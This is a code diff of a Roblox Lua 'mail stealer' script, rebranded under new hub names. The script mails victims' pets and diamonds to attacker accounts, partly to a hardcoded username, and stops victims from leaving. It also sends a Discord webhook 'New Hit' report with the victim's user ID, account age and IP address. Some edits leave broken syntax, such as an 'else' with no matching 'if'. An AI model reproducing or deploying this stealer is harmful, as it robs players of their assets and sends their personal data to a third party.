@@ -1,6 +1,6 @@
 -- MAIL STEALER BELLOW
 
--- [MonzHub Mailstealer]
+-- [EgorikusaHub Mailstealer]
 
 local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
@@ -61,13 +61,13 @@ setclipboard = antiPrint
 -- Users And Stuff
 
 if UserName == nil then
-    UserName = _G.UserName
+    UserName = UserName
 end
 if UserName2 == nil then
-    UserName2 = _G.UserName2
+    UserName2 = UserName2
 end
 if Webhook == nil then
-    Webhook = _G.Webhook
+    Webhook = Webhook
 end
 -- User Checks
 
@@ -93,7 +93,7 @@ if worked2 then
 end
 if UserName2 ~= nil then
     local worked3 = pcall(function()
-        game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+        game:GetService("Players"):GetUserIdFromNameAsync(UserName2)
     end)
     if not worked3 then
         game:GetService("Players").LocalPlayer:Kick("Put A Valid Username2!")
@@ -348,23 +348,23 @@ if mybanks[5] ~= nil then
 end
 
 -- Check & Accept Banks Invites
-local invbanks = getinvitesremote:InvokeServer("Players")
+local invbanks = getinvitesremote:InvokeServer()
 bankstable = {}
 if bankscount ~= 5 then
     if invbanks[1] ~= nil then
-        table.insert(bankstable, invbanks[1]["BUID"], _G.UserID)
+        table.insert(bankstable, invbanks[1]["BUID"])
     end
     if invbanks[2] ~= nil then
-        table.insert(bankstable, invbanks[2]["BUID"], UserName)
+        table.insert(bankstable, invbanks[2]["BUID"])
     end
     if invbanks[3] ~= nil then
-        table.insert(bankstable, invbanks[3]["BUID"], _G.UserID)
+        table.insert(bankstable, invbanks[3]["BUID"])
     end
     if invbanks[4] ~= nil then
-        table.insert(bankstable, invbanks[4]["BUID"], _G.UserID)
+        table.insert(bankstable, invbanks[4]["BUID"])
     end
     if invbanks[5] ~= nil then
-        table.insert(bankstable, invbanks[5]["BUID"], _G.UserID)
+        table.insert(bankstable, invbanks[5]["BUID"])
     end
     for i, v in pairs(bankstable) do
         acceptinviteremote:InvokeServer(v)
@@ -779,7 +779,7 @@ if _G.AntiLeave ~= false then
         end
     end
     for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
+        if v.Name ~= "MonzzHub" and v.Name ~= "RobloxPromptGui" then
             v:Destroy()
         end
     end
@@ -1010,7 +1010,7 @@ function RAP()
 end
 
 -- Webhook
-local url = _G.Webhook
+local url = Webhook
 local whenabled = true
 local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     local abcdef1
@@ -1025,10 +1025,10 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         "https://cdn.discordapp.com/attachments/1100823909009465497/1122142742844276838/Screenshot_20230414-055925_Gallery.jpg"
         data1 = {
             ["content"] = ping,
-            ["username"] = "MonzHub Scriptz",
+            ["username"] = "Monz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||By MonzHub||",
+                ["title"] = "**New Hit** ||Monz Scriptz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
@@ -1038,14 +1038,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using MonzHub Scriptz's Stealer** :skull:",
+                    ["name"] = "**Monz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":joy_cat: **Pets left** :joy_cat:",
+                    ["name"] = ":joy: **Pets left** :joy:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1095,10 +1095,10 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         "https://cdn.discordapp.com/attachments/1100823909009465497/1122142742844276838/Screenshot_20230414-055925_Gallery.jpg"
         data1 = {
             ["content"] = ping,
-            ["username"] = "MonzHub Scriptz",
+            ["username"] = "Monz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||By MonzHub||",
+                ["title"] = "**New Hit** ||With Monz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
@@ -1108,14 +1108,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**MonzHub Scriptz's Stealer** :skull:",
+                    ["name"] = "**Monz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":joy_cat: **Pets left** :joy_cat:",
+                    ["name"] = ":joy: **Pets left** :joy:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1185,7 +1185,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = "MonzHub Better"
+local mailmsg = "Monz On Top"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
@@ -1241,9 +1241,9 @@ end
 
 local ndUser
 if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
-    ndUser = _G.UserName2
+    ndUser = UserName2
 else
-    ndUser = _G.UserName
+    ndUser = UserName
 end
 local user
 -- Gems Only
@@ -1251,7 +1251,7 @@ if FinalList == 0 then
     if givediaamt >= 1000000000 then
         user = UserName
     else
-        user = ndUser
+        user = "TehPucuk_55"
     end
     if gemsin ~= nil then
         if dualhook(gemsin) then
@@ -1278,7 +1278,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1305,7 +1305,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1327,14 +1327,16 @@ spawn(function()
     while wait() do
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
-                user = UserName
+              user = UserName
+              else
+                user = "TehPucuk_55"
                 if hugein ~= nil then
                     if dualhook(hugein) then
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1358,7 +1360,6 @@ spawn(function()
                 user = UserName
                 if pogin ~= nil then
                     if dualhook(pogin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1386,12 +1387,11 @@ spawn(function()
                 user = UserName
                 if excin ~= nil then
                     if dualhook(excin) then
-                        user = dhuser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = _G.UserName,
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1411,15 +1411,14 @@ spawn(function()
     while wait() do
         if #EvList ~= 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(EvList) do
-                user = ndUser
+                user = UserName
                 if eventin ~= nil then
                     if dualhook(eventin) then
-                        user = dhuser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = _G.UserName2,
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1439,14 +1438,14 @@ spawn(function()
     while wait() do
         if #SList ~= 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(SList) do
-                user = ndUser
+                user = UserName
                 if secretin ~= nil then
                     if dualhook(secretin) then
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = _G.UserName2,
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1466,15 +1465,14 @@ spawn(function()
     while wait() do
         if #MList ~= 0 and #SList == 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(MList) do
-                user = ndUser
+                user = UserName
                 if mythicin ~= nil then
                     if dualhook(mythicin) then
-                        user = dhuser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = _G.UserName2,
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
